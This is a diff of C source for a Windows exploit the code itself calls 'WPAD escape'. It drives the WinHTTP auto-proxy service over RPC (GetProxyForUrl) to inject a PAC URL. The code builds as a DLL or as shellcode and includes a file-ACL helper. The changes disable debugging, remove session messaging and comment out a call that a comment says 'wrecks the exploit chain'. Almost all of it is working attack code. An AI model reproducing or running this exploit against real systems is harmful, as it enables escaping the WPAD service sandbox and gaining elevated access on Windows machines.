@@ -1,11 +1,9 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
-#include <WtsApi32.h>
 #include "IWinHttpAutoProxySvc_h.h"
 
 #pragma comment(lib, "rpcrt4.lib")
-#pragma comment(lib, "Wtsapi32.lib")
 
 BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
 
@@ -14,7 +12,7 @@ BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
 // Global settings
 ////////
 
-#define DEBUG
+//#define DEBUG
 //#define EXE_BUILD
 #define DLL_BUILD
 #define SHELLCODE_BUILD
@@ -35,14 +33,15 @@ void DebugLog(const wchar_t* Format, ...) {
     if (pBuffer == NULL) {
         pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
     }
+    else {
+        ZeroMemory(pBuffer, 10000 * 2);
+    }
 
     va_start(Args, Format);
     wvsprintfW(pBuffer, Format, Args);
     va_end(Args);
 #ifdef DLL_BUILD
     MessageBoxW(NULL, pBuffer, L"WPAD escape", 0);
-    //uint32_t dwMsgAnswer = 0;
-    //WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, SESSION_ID, (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
 #endif
 #ifdef EXE_BUILD
     printf("%ws\r\n", pBuffer);
@@ -134,7 +133,6 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 #ifdef DEBUG
                     DebugLog(L"... calling GetProxyForUrl RPC method.");
 #endif
-
                     GetProxyForUrl(
                         &RpcAsyncState,
                         hRpcBinding,
@@ -150,24 +148,21 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                     );
                 }
                 RpcExcept(1) {
-                    RpcStatus = RpcExceptionCode();
+                    //RpcStatus = RpcExceptionCode();
 #ifdef DEBUG
-                    DebugLog(L"... GetProxyForUrl failed. Error: 0x%X", RpcExceptionCode());
+                    DebugLog(L"... GetProxyForUrl failed. Error: 0x%x", RpcExceptionCode());
 #endif
                 }
                 RpcEndExcept
 
                 uint32_t dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);
-
+                
                 if (RpcAsyncState.u.hEvent != NULL) { // Unclear why this would occur, perhaps the RPC server or OS may closed it autonomously?
                     CloseHandle(RpcAsyncState.u.hEvent);
                 }
                 
                 if (dwWaitResult == WAIT_OBJECT_0) {
-#ifdef DEBUG
-                    DebugLog(L"... RPC call to WPAD GetProxyForUrl signalled async state event.");
-#endif
-                    RpcAsyncCompleteCall(&RpcAsyncState, &nReply);
+                    //RpcAsyncCompleteCall(&RpcAsyncState, &nReply); // This may crash with exception RPC_S_INTERNAL_ERROR in some cases. When repetition is needed it wrecks the exploit chain.
                 }
                 else {
 #ifdef DEBUG
@@ -178,7 +173,7 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
             }
             else {
 #ifdef DEBUG
-                DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%X", RpcStatus);
+                DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%x", RpcStatus);
 #endif
             }
 
@@ -186,7 +181,7 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
         }
         else {
 #ifdef DEBUG
-            DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%X", RpcStatus);
+            DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%x", RpcStatus);
 #endif
         }
 
@@ -194,7 +189,7 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
     }
     else {
 #ifdef DEBUG
-        DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
+        DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%x", RpcStatus);
 #endif
     }
 
@@ -205,16 +200,6 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
 #ifdef DLL_BUILD
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
-    /*
-    static BOOL bRunOnce = FALSE;
-
-    if (!bRunOnce) {
-        bRunOnce = TRUE;
-    }
-    else {
-        Sleep(INFINITE); // Catch/trap multiple executions
-    }
-    */
     switch (dwReason) {
         case DLL_PROCESS_ATTACH:
 #ifdef SHELLCODE_BUILD
